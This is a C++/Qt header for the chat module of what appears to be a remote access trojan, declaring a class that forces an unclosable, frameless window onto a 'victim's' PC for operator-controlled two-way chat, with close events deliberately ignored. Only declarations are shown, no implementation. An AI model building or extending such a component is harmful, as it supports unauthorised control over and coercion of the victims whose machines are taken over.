#ifndef CHAT_H
#define CHAT_H

#include <QWidget>
#include <QCloseEvent>
#include <Windows.h>
#include "tcpsocket.h"


//*************************************//
//*************************************//
//***     Client - Chat Module      ***//
//***      Class Header File        ***//
//*************************************//
//*************************************//

//This class allows the user to communicate directly with the victim. A window pops up on the victim's pc
//which can't be closed. Two way communication from that window is possible. Only the user can close the
//window. The window created on victims pc is a cool black, frameless unmoveable window.


namespace Ui {
class chat;
}


//Inherits QWidget(Qt's class) because  objects of this class have GUIs
class chat : public QWidget
{
    Q_OBJECT
    Ui::chat *ui; //GUI
    tcpsocket *communicationSocket;  //Pointer of a socket object(which allows communication with the server)

public:
    explicit chat(QWidget *parent = 0, tcpsocket *comSock = NULL);  //Constructor
    ~chat();  //Destructor

protected:
    void closeEvent(QCloseEvent *);  //Overloaded function - to ignore close() events even from taskbar

public slots:
    void recievedCommand(QByteArray input); //Slot of the signal comming from the socket

private slots:
    void on_pushButton_clicked();  //Private slot for the 'reply' button
    void on_lineEdit_returnPressed();
};

#endif // CHAT_H
